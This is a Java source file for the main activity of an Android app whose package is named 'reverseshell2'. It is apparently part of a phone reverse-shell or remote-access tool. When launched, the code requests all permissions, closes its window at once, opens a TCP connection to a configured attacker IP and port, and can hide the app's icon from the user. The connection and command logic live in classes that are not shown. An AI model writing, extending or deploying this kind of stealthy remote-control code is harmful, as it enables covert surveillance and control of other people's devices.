package com.example.reverseshell2;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context = getApplicationContext();
        Log.d(TAG, config.IP + "\t" + config.port);
        PermissionHelper.requestAll(this, this::startConnection);
    }

    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            @NonNull String[] permissions,
            @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        PermissionHelper.onRequestPermissionsResult(requestCode);
    }

    private void startConnection() {
        finish();
        new tcpConnection(activity, context).execute(config.IP, config.port);
        overridePendingTransition(0, 0);
        if (config.icon) {
            new functions(activity).hideAppIcon(context);
        }
    }
}
